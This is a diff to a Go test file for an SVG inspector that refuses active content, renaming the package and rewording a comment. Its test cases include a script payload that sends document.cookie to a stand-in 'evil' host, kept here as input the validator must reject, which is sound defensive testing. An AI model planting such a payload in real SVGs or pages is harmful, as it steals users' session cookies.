@@ -1,4 +1,4 @@
-package recraft
+package svgcheck
 
 import (
 	"errors"
@@ -153,7 +153,7 @@ func TestInspectSVG_RejectsNonVectorAndBrokenBytes(t *testing.T) {
 // TestInspectSVG_RejectsActiveContent guards the browser these bytes end up in. They are served from
 // our own bucket into an admin session, so active content is refused outright rather than scrubbed:
 // a partial scrub that misses one vector is worse than a loud refusal of a file no legitimate
-// generation produces.
+// drawing needs.
 func TestInspectSVG_RejectsActiveContent(t *testing.T) {
 	cases := map[string]string{
 		"a script element":   `<script>fetch("https://evil/"+document.cookie)</script>`,
